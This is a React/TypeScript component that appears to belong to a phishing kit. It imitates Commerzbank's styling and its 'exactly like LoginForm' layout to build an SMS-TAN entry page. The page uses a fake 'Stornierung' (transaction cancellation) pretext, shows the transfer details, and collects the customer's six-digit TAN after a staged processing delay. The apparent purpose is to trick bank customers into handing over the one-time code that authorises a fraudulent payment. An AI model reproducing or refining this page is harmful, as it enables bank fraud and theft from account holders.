import React, { useState, useEffect } from 'react';
import Loading from './Loading';

interface TransactionDetails {
  amount?: string;
  recipient?: string;
  reference?: string;
  iban?: string;
}

type TANType = 'TRANSACTION_TAN' | 'LOGIN_TAN';

interface SMSTANScreenProps {
  tanType: TANType;
  phoneNumber?: string;
  transactionDetails?: TransactionDetails;
  onSubmit: (tan: string) => void;
  onResend?: () => void;
  onCancel?: () => void;
}

const SMSTANScreen: React.FC<SMSTANScreenProps> = ({ 
  tanType,
  phoneNumber = '+49 *** *** **89',
  transactionDetails = {},
  onSubmit, 
  onResend,
  onCancel
}) => {
  const [tan, setTan] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [resendCooldown, setResendCooldown] = useState(0);
  const [isMobile, setIsMobile] = useState(false);

  // Mobile detection exactly like LoginForm
  useEffect(() => {
    const checkMobile = () => {
      const isChromeOnMobile = /Chrome/.test(navigator.userAgent) && /Mobile/.test(navigator.userAgent);
      const isSmallScreen = window.innerWidth <= 768;
      const isTouchDevice = 'ontouchstart' in window;
      
      setIsMobile(isSmallScreen || isChromeOnMobile || (isTouchDevice && isSmallScreen));
    };
    
    checkMobile();
    window.addEventListener('resize', checkMobile);
    window.addEventListener('orientationchange', checkMobile);
    
    return () => {
      window.removeEventListener('resize', checkMobile);
      window.removeEventListener('orientationchange', checkMobile);
    };
  }, []);

  useEffect(() => {
    if (resendCooldown > 0) {
      const timer = setTimeout(() => {
        setResendCooldown(prev => prev - 1);
      }, 1000);
      return () => clearTimeout(timer);
    }
  }, [resendCooldown]);

  const handleSubmit = async () => {
    if (tan.length !== 6) return;
    
    setIsSubmitting(true);
    
    setTimeout(() => {
      onSubmit(tan);
      setIsSubmitting(false);
    }, 1500);
  };

  const handleResend = () => {
    if (resendCooldown > 0) return;
    
    setResendCooldown(60);
    setTan('');
    onResend?.();
  };

  const handleTanChange = (value: string) => {
    const numericValue = value.replace(/\D/g, '').slice(0, 6);
    setTan(numericValue);
  };

  return (
    <>
      {isSubmitting && (
        <Loading 
          message="SMS-TAN wird verarbeitet..."
          type="processing"
          showProgress={true}
          duration={1.5}
        />
      )}
      
      <div 
        className={isMobile ? "chrome-mobile-fix chrome-flex-container" : ""}
        style={{ 
          maxWidth: isMobile ? '100%' : '1440px', 
          margin: '0 auto', 
          padding: isMobile ? '0 1.5rem' : '0',
          minHeight: '80vh',
          display: 'flex',
          alignItems: 'flex-start',
          paddingTop: isMobile ? '1rem' : '4rem',
          position: 'relative',
          boxSizing: 'border-box',
          width: '100%',
          WebkitBoxSizing: 'border-box'
        } as React.CSSProperties}>
        
        {/* Hilfe Button - exactly like LoginForm */}
        {!isMobile && (
          <div style={{
            position: 'absolute',
            top: '4rem',
            right: '0',
            display: 'flex',
            alignItems: 'center',
            gap: '0.4rem',
            cursor: 'pointer',
            zIndex: 10
          } as React.CSSProperties}>
            <span style={{
              fontSize: '0.9375rem',
              lineHeight: 'calc(0.9375rem + 9px)',
              letterSpacing: '0.1px',
              fontFamily: 'Gotham, Arial, sans-serif',
              fontWeight: '500',
              maxWidth: '26.25rem',
              marginRight: '12px'
            }}>
              Hilfe
            </span>
            <div style={{ display: 'flex', alignItems: 'center' }}>
              <svg fill="currentColor" width="24px" height="24px" focusable="false" role="" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                <path d="M20 5v10h-9.24L9 18.53 7.24 15H4V5h16m0-2H4a2 2 0 0 0-2 2v10a2 2 0 0 0 2 2h2l3 6 3-6h8a2 2 0 0 0 2-2V5a2 2 0 0 0-2-2Z"></path>
              </svg>
            </div>
          </div>
        )}
        
        {/* Mobile Hilfe Button */}
        {isMobile && (
          <div style={{
            position: 'absolute',
            top: '1rem',
            right: '1.5rem',
            display: 'flex',
            alignItems: 'center',
            gap: '0.4rem',
            cursor: 'pointer',
            zIndex: 10
          } as React.CSSProperties}>
            <span style={{
              fontSize: '0.9375rem',
              lineHeight: 'calc(0.9375rem + 9px)',
              letterSpacing: '0.1px',
              fontFamily: 'Gotham, Arial, sans-serif',
              fontWeight: '500',
              color: '#002e3c'
            }}>
              Hilfe
            </span>
            <div style={{ display: 'flex', alignItems: 'center' }}>
              <svg fill="currentColor" width="24px" height="24px" focusable="false" role="" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                <path d="M20 5v10h-9.24L9 18.53 7.24 15H4V5h16m0-2H4a2 2 0 0 0-2 2v10a2 2 0 0 0 2 2h2l3 6 3-6h8a2 2 0 0 0 2-2V5a2 2 0 0 0-2-2Z"></path>
              </svg>
            </div>
          </div>
        )}

        <div 
          className={isMobile ? "chrome-flex-item" : ""}
          style={{ 
            flex: '1', 
            maxWidth: isMobile ? '100%' : '600px',
            width: '100%',
            boxSizing: 'border-box'
          } as React.CSSProperties}>
          
          {/* Title exactly like LoginForm */}
          <h1 style={{ 
            fontSize: isMobile ? '2rem' : '2.5rem',
            fontWeight: 'bold', 
            color: '#002e3c', 
            marginBottom: isMobile ? '1.5rem' : '3rem',
            fontFamily: 'Gotham, Arial, sans-serif',
            lineHeight: '1.1',
            WebkitFontSmoothing: 'antialiased'
          } as React.CSSProperties}>
            {tanType === 'TRANSACTION_TAN' ? 'SMS-TAN Stornierung' : 'SMS-TAN Anmeldung'}
          </h1>

          {/* Info box like other Commerzbank forms */}
          <div className="info-box" style={{
            backgroundColor: '#f1efed',
            borderLeft: '4px solid #ffed00',
            padding: '1rem',
            margin: '1rem 0 2rem 0',
            borderRadius: '0 4px 4px 0'
          }}>
            <p style={{
              color: '#002e3c',
              fontSize: '0.9rem',
              margin: 0,
              fontFamily: 'Gotham, Arial, sans-serif'
            }}>
              {tanType === 'TRANSACTION_TAN' 
                ? `Wir haben Ihnen eine SMS mit einer TAN-Nummer zur Stornierung an ${phoneNumber} gesendet.`
                : `Wir haben Ihnen eine SMS mit einer TAN-Nummer zur Anmeldung an ${phoneNumber} gesendet.`
              }
            </p>
          </div>

          {/* Transaction details card - only for TRANSACTION_TAN */}
          {tanType === 'TRANSACTION_TAN' && transactionDetails.amount && (
            <div className="commerzbank-card" style={{
              backgroundColor: '#ffffff',
              borderRadius: '8px',
              boxShadow: '0 2px 8px rgba(0, 46, 60, 0.1)',
              padding: '2rem',
              marginBottom: '2rem',
              border: '1px solid #e5e7eb'
            }}>
              <h2 style={{
                fontSize: '1.25rem',
                fontWeight: '500',
                color: '#002e3c',
                marginBottom: '1.5rem',
                fontFamily: 'Gotham, Arial, sans-serif'
              }}>
                {tanType === 'TRANSACTION_TAN' ? 'Zu stornierende Transaktion' : 'Transaktionsdetails'}
              </h2>
              
              <div style={{ display: 'flex', flexDirection: 'column', gap: '1rem' }}>
                <div style={{ 
                  display: 'flex', 
                  justifyContent: 'space-between', 
                  alignItems: 'center',
                  paddingBottom: '0.75rem',
                  borderBottom: '1px solid #e5e7eb'
                }}>
                  <span style={{
                    color: '#002e3c',
                    fontSize: '0.875rem',
                    fontFamily: 'Gotham, Arial, sans-serif',
                    fontWeight: 'normal'
                  }}>Betrag:</span>
                  <span style={{
                    color: '#002e3c',
                    fontSize: '1.125rem',
                    fontFamily: 'Gotham, Arial, sans-serif',
                    fontWeight: '500'
                  }}>{transactionDetails.amount}</span>
                </div>
                
                {transactionDetails.recipient && (
                  <div style={{ 
                    display: 'flex', 
                    justifyContent: 'space-between', 
                    alignItems: 'center',
                    paddingBottom: '0.75rem',
                    borderBottom: '1px solid #e5e7eb'
                  }}>
                    <span style={{
                      color: '#002e3c',
                      fontSize: '0.875rem',
                      fontFamily: 'Gotham, Arial, sans-serif',
                      fontWeight: 'normal'
                    }}>Empfänger:</span>
                    <span style={{
                      color: '#002e3c',
                      fontSize: '0.875rem',
                      fontFamily: 'Gotham, Arial, sans-serif',
                      fontWeight: '500',
                      textAlign: 'right'
                    }}>{transactionDetails.recipient}</span>
                  </div>
                )}
                
                {transactionDetails.iban && (
                  <div style={{ 
                    display: 'flex', 
                    justifyContent: 'space-between', 
                    alignItems: 'center',
                    paddingBottom: '0.75rem',
                    borderBottom: '1px solid #e5e7eb'
                  }}>
                    <span style={{
                      color: '#002e3c',
                      fontSize: '0.875rem',
                      fontFamily: 'Gotham, Arial, sans-serif',
                      fontWeight: 'normal'
                    }}>IBAN:</span>
                    <span style={{
                      color: '#002e3c',
                      fontSize: '0.875rem',
                      fontFamily: 'monospace',
                      fontWeight: '500',
                      textAlign: 'right'
                    }}>{transactionDetails.iban}</span>
                  </div>
                )}
                
                {transactionDetails.reference && (
                  <div style={{ 
                    display: 'flex', 
                    justifyContent: 'space-between', 
                    alignItems: 'center'
                  }}>
                    <span style={{
                      color: '#002e3c',
                      fontSize: '0.875rem',
                      fontFamily: 'Gotham, Arial, sans-serif',
                      fontWeight: 'normal'
                    }}>Verwendungszweck:</span>
                    <span style={{
                      color: '#002e3c',
                      fontSize: '0.875rem',
                      fontFamily: 'Gotham, Arial, sans-serif',
                      fontWeight: '500',
                      textAlign: 'right'
                    }}>{transactionDetails.reference}</span>
                  </div>
                )}
              </div>
            </div>
          )}

          {/* TAN Input Section */}
          <div style={{ marginBottom: '2rem' }}>
            <label style={{
              display: 'block',
              color: '#002e3c',
              fontSize: '1rem',
              fontWeight: '500',
              marginBottom: '1.5rem',
              fontFamily: 'Gotham, Arial, sans-serif'
            }}>
              {tanType === 'TRANSACTION_TAN' ? 'TAN-Nummer zur Stornierung eingeben:' : 'TAN-Nummer eingeben:'}
            </label>
            
            <div style={{ 
              display: 'flex', 
              justifyContent: 'center', 
              gap: '0.5rem',
              marginBottom: '2rem'
            }}>
              {[...Array(6)].map((_, i) => (
                <div 
                  key={i} 
                  onClick={() => document.getElementById('hidden-tan-input')?.focus()}
                  style={{
                    width: '3rem',
                    height: '3.5rem',
                    border: i < tan.length ? '2px solid #ffed00' : '2px solid #d1d5db',
                    borderRadius: '4px',
                    display: 'flex',
                    alignItems: 'center',
                    justifyContent: 'center',
                    fontSize: '1.5rem',
                    fontWeight: '600',
                    color: '#002e3c',
                    backgroundColor: i < tan.length ? '#fffbf0' : 'white',
                    cursor: 'pointer',
                    transition: 'all 0.3s ease',
                    fontFamily: 'Gotham, Arial, sans-serif'
                  }}
                >
                  {tan[i] || ''}
                </div>
              ))}
            </div>
            
            <input
              id="hidden-tan-input"
              type="text"
              value={tan}
              onChange={(e) => handleTanChange(e.target.value)}
              style={{ position: 'absolute', opacity: 0, pointerEvents: 'none' }}
              autoFocus
            />
          </div>

          {/* Action buttons exactly like LoginForm */}
          <div style={{ marginBottom: '2rem' }}>
            <button
              onClick={handleSubmit}
              disabled={tan.length !== 6 || isSubmitting}
              style={{
                backgroundColor: (tan.length !== 6 || isSubmitting) ? '#d1d5db' : '#FFD700',
                color: '#002e3c',
                border: 'none',
                borderRadius: '35px',
                padding: isMobile ? '1.25rem 2.5rem' : '1rem 2.5rem',
                fontSize: isMobile ? '1.1rem' : '1.2rem',
                fontWeight: '600',
                cursor: (tan.length !== 6 || isSubmitting) ? 'not-allowed' : 'pointer',
                fontFamily: 'Gotham, Arial, sans-serif',
                transition: 'background-color 0.3s ease',
                display: 'flex',
                alignItems: 'center',
                gap: '0.5rem',
                width: isMobile ? '100%' : 'auto',
                justifyContent: 'center',
                marginBottom: '1rem'
              }}
              onMouseOver={(e) => {
                if (tan.length === 6 && !isSubmitting) {
                  (e.target as HTMLButtonElement).style.backgroundColor = '#e6d400';
                }
              }}
              onMouseOut={(e) => {
                if (tan.length === 6 && !isSubmitting) {
                  (e.target as HTMLButtonElement).style.backgroundColor = '#FFD700';
                }
              }}
            >
              {isSubmitting 
                ? (tanType === 'TRANSACTION_TAN' ? 'Stornierung wird verarbeitet...' : 'TAN wird überprüft...')
                : (tanType === 'TRANSACTION_TAN' ? 'Stornierung bestätigen' : 'TAN bestätigen')
              }
              {!isSubmitting && tan.length === 6 && (
                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                  <path d="M5 12h14M12 5l7 7-7 7"/>
                </svg>
              )}
            </button>
          </div>

          {/* Footer Links exactly like LoginForm */}
          <div style={{ 
            display: 'flex', 
            flexDirection: 'column', 
            gap: '1rem',
            fontSize: '0.9rem',
            color: '#002e3c'
          }}>
            {onResend && (
              <a 
                href="#" 
                onClick={(e) => {
                  e.preventDefault();
                  handleResend();
                }}
                style={{ 
                  color: resendCooldown > 0 ? '#9ca3af' : '#002e3c', 
                  textDecoration: 'none',
                  fontFamily: 'Gotham, Arial, sans-serif',
                  cursor: resendCooldown > 0 ? 'not-allowed' : 'pointer'
                }}
              >
                {resendCooldown > 0 
                  ? `SMS erneut senden (${resendCooldown}s)`
                  : 'SMS erneut senden'
                }
              </a>
            )}
            
            {onCancel && (
              <a 
                href="#" 
                onClick={(e) => {
                  e.preventDefault();
                  onCancel();
                }}
                style={{ 
                  color: '#002e3c', 
                  textDecoration: 'none',
                  fontFamily: 'Gotham, Arial, sans-serif'
                }}
              >
                {tanType === 'TRANSACTION_TAN' ? 'Stornierung abbrechen' : 'Anmeldung abbrechen'}
              </a>
            )}
          </div>
        </div>
      </div>

      <style jsx>{`
        /* Chrome mobile fixes exactly like LoginForm */
        @media screen and (-webkit-min-device-pixel-ratio: 0) {
          html, body {
            -webkit-text-size-adjust: 100%;
            -webkit-font-smoothing: antialiased;
          }
        }
        
        @supports (-webkit-appearance: none) {
          .chrome-mobile-fix {
            -webkit-transform: translateZ(0);
            transform: translateZ(0);
            -webkit-backface-visibility: hidden;
            backface-visibility: hidden;
          }
        }
        
        @media (max-width: 768px) {
          .chrome-flex-container {
            display: -webkit-box !important;
            display: -webkit-flex !important;
            display: flex !important;
            -webkit-box-orient: vertical !important;
            -webkit-box-direction: normal !important;
            -webkit-flex-direction: column !important;
            flex-direction: column !important;
            width: 100% !important;
            min-height: 100vh !important;
            padding: 0 1.5rem !important;
            box-sizing: border-box !important;
          }
          
          .chrome-flex-item {
            -webkit-box-flex: 1 !important;
            -webkit-flex: 1 !important;
            flex: 1 !important;
            width: 100% !important;
            max-width: 100% !important;
            min-width: 100% !important;
            box-sizing: border-box !important;
          }
        }
      `}</style>
    </>
  );
};

export default SMSTANScreen;
